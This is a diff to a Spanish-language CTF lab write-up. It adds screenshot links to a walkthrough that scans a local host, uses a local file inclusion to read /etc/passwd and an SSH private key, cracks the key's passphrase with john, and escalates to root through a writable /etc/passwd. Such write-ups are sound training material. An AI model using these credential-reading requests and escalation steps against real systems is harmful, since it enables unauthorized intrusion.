@@ -25,6 +25,7 @@ Escaneo de puertos:
 ```bash
 nmap -p- --open --min-rate 5000 -n -Pn -sC -sV 192.168.1.79 -oN scan
 ```
+![Escaneo NMAP](screenshots/01-nmap-scan.png)
 
 Resultado: puertos **22 (SSH)** y **80 (HTTP)** abiertos.
 
@@ -57,6 +58,7 @@ Se pasa sin sanitizar la función `include()` de PHP en el backend que permite e
 ```
 http://192.168.1.79/doctor-item.php?include=../../../../etc/passwd
 ```
+![LFI /etc/passwd](screenshots/02-lfi-etc-passwd.png)
 
 ### 2. `/etc/passwd` con permisos de escritura
 
@@ -82,6 +84,8 @@ Identificado usuario del sistema `admin`.
 http://192.168.1.79/../../../home/admin/.ssh/id_rsa
 ```
 
+![Clave RSA](screenshots/03-lfi-ssh-key.png)
+
 Obtengo clave RSA cifrada (`Proc-Type: 4,ENCRYPTED`). Reconstruimos los saltos de línea correctos entre cabecera, `Proc-Type`, `DEK-Info` y el cuerpo base64) para que SSH pueda interpretarlo.
 
 Formato corregido y permisos asignados:
@@ -98,6 +102,7 @@ La clave está protegida por contraseña. Extraigo el hash:
 ssh2john id_rsa > hash.txt
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
+![Cracking passphrase](screenshots/04-john-crack-passphrase.png)
 
 Passphrase obtenida: `unicorn`
 
@@ -106,6 +111,8 @@ Passphrase obtenida: `unicorn`
 ```bash
 ssh -i id_rsa admin@192.168.1.79
 ```
+
+![Acceso SSH](screenshots/05-ssh-access-admin.png)
 
 Éxito en la autenticación consigo shell como `admin`.
 
@@ -132,6 +139,7 @@ Identifico `/etc/passwd` como archivo editable. Verifico permisos:
 ```bash
 ls -la /etc/passwd
 ```
+![Permisos /etc/passwd](screenshots/06-etc-passwd-permissions.png)
 
 Genero hash de contraseña UID/GID `0`:
 
@@ -154,6 +162,7 @@ Obtengo acceso como root:
 id
 # uid=0(root) gid=0(root) groups=0(root)
 ```
+![Acceso root](screenshots/07-root-access.png)
 
 **Flag de root:** `dfde8cc67ed8819b2386dc74e472ecc6`
 
